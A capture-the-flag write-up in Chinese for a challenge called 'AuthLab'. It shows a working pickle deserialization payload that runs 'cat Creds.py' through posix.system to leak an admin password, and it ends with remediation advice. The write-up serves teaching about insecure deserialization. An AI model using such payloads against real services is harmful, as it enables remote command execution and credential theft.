# AuthLab

## 题目简述

认证服务的 EasyCreds 功能把客户端提交的 Base64 数据直接交给 `pickle.loads`。题目表面要求伪造管理员身份，实际最直接的目标是借反序列化执行系统命令，读取保存管理员密码的 `Creds.py`。

## 解题过程

Python pickle 不是纯数据格式，`GLOBAL`、`REDUCE` 等 opcode 可以导入可调用对象并以栈上的参数调用。构造最短协议 0 payload：

```python
payload = b"cposix\nsystem\n(S'cat Creds.py'\ntR."
token = base64.b64encode(payload)
```

其语义依次是：

```text
GLOBAL posix system
STRING 'cat Creds.py'
TUPLE
REDUCE
STOP
```

选择 `[E] Login with EasyCreds` 并提交 token。`pickle.loads` 在返回用户对象之前便执行 `cat Creds.py`，命令标准输出直接混入网络连接，泄露管理员密码：

```text
grey{4_p1ck13d_p4ssw0rd_s0uNd5_n1C3}
```

即使伪造一个 `Creds` 对象使 `rank` 为 ADMIN，也只会进入占位管理员服务，并不自动打印密码；RCE 才是完成目标的闭环路径。

## 方法总结

对不可信数据调用 `pickle.loads` 等价于允许对方运行 Python 构造协议，不能靠后续类型或权限字段检查补救。若必须序列化会话，应改用 JSON 等数据格式，并由服务端签名、校验字段；不要让客户端提交任意 pickle。题目核心是语言级反序列化执行边界，因此归入 pwn。
